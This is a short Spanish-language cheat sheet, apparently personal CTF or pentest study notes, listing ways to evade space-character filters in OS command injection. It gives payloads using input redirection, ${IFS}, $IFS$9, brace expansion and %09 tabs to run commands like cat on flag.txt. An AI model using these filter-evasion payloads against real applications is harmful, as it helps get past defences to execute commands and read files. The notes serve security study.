---
aliases:
tags:
  - type/cheatsheet
type: CheatSheet
linked:
  - "[[OS Command Injection]]"
primary categories:
secondary categories:
tertiary categories:
---
# Bypass de Espacios en Command Injection
Técnicas para ejecutar comandos cuando el carácter "espacio" está bloqueado (WAF/Filtros).

___

## Cheatsheet

Técnicas para ejecutar comandos cuando la barra espaciadora o el carácter `%20` están bloqueados por el filtro.

| **Técnica**                                            | **Sintaxis / Payload**                  | **Ejemplo Real**                          | **Notas / Restricciones**                                                                                          |
| ------------------------------------------------------ | --------------------------------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| <br>**Input Redirection**                              | <pre><code>comando<archivo</code></pre> | <pre><code>cat<flag.txt</code></pre>      | Reemplaza el espacio por el operador `<`. **Ideal para leer archivos**, no sirve para argumentos de texto plano.   |
| <br>**Internal Field Separator**<br><br>_(Con Llaves)_ | <pre><code>${IFS}</code></pre>          | <pre><code>cat${IFS}flag.txt</code></pre> | <br>`$IFS` es una variable que contiene espacio, tab y salto de línea. Las llaves delimitan la variable.           |
| <br>**Internal Field Separator**<br><br>_(Sin Llaves)_ | <pre><code>$IFS$9</code></pre>          | <pre><code>cat$IFS$9flag.txt</code></pre> | <br>Usar `$9` (argumento vacío) para separar la variable `$IFS` del siguiente texto si `{}` están bloqueados.      |
| <br>**Brace Expansion**                                | <pre><code>{comando,arg}</code></pre>   | <pre><code>{cat,flag.txt}</code></pre>    | <br>**Solo Bash.** Expande los elementos separados por coma añadiendo espacios automáticamente.                    |
| <br>**Tabs (Tabuladores)**                             | <pre><code>%09</code></pre>             | <pre><code>cat%09flag.txt</code></pre>    | Muchos WAFs bloquean el espacio (`%20`) pero olvidan el tabulador (`%09`), que la shell interpreta como separador. |
^ci-bypass-espacios

> [!TIP] Variable $IFS
> Si se quiere ver qué contiene `$IFS`en el sistema víctima (y por qué funciona esto), se puede hacer:`echo -n "$IFS" | xxd\`
> Se verá que contiene: `09` (Tab), `0a` (New Line) y `20` (Space). Cualquiera de ellos actúa como separador.


___
